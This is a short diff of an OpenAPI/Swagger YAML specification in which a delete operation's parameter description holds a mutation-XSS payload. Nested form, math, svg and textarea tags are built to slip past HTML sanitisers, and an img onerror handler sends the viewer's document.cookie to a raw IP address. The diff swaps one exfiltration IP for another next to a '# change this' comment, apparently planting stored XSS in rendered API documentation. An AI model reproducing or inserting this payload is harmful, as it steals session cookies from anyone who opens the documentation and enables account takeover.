@@ -28,7 +28,7 @@ paths:
     delete:
       parameters:
         - description: |                                                                                                        # change this
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x onerror=this.src='http://38.242.133.124/?'+document.cookie;>"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x onerror=this.src='http://101.188.67.134/?'+document.cookie;>"></form>
 
           format: int64
           in: path
